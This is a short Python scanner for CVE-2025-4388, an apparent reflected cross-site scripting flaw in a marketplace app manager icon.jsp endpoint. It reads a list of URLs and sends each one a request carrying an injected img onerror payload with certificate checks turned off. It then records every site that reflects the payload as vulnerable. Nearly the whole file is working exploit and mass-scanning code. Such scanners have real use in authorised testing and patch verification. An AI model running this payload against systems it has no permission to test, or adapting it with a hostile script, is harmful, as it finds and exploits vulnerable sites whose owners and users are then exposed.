#!/usr/bin/env python3

import os
import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(InsecureRequestWarning)

# Payload for CVE-2025-4388
payload = '/o/marketplace-app-manager-web/icon.jsp?iconURL=http://"><img%20src=x%20onerror="prompt(1)">'

def vulncheck(base_url, output_file):
    try:
        test_url = base_url.rstrip('/') + payload
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept-Encoding": "identity"
        }

        r = requests.get(test_url, timeout=7, verify=False, allow_redirects=False, headers=headers)

        if 'prompt(1)">' in r.text:
            print(f"[+] {test_url} is VULNERABLE")
            with open(output_file, "a") as out:
                out.write(f"{test_url}\n")
        else:
            print(f"[-] {base_url} seems not vulnerable")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error testing {base_url} -> {e}")

def main(input_file, output_file):
    if not os.path.exists(input_file):
        print(f"[!] File {input_file} does not exist")
        return

    print(f"[+] Reading from: {input_file}")
    with open(input_file, 'r') as f:
        urls = f.readlines()

    for url in urls:
        url = url.strip()
        if url:
            vulncheck(url, output_file)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-4388 XSS Scanner")
    parser.add_argument("-i", "--input", required=True, help="File with list of base URLs to scan")
    parser.add_argument("-o", "--output", help="File to save vulnerable URLs", default="cve-2025-4388.txt")

    args = parser.parse_args()
    main(args.input, args.output)

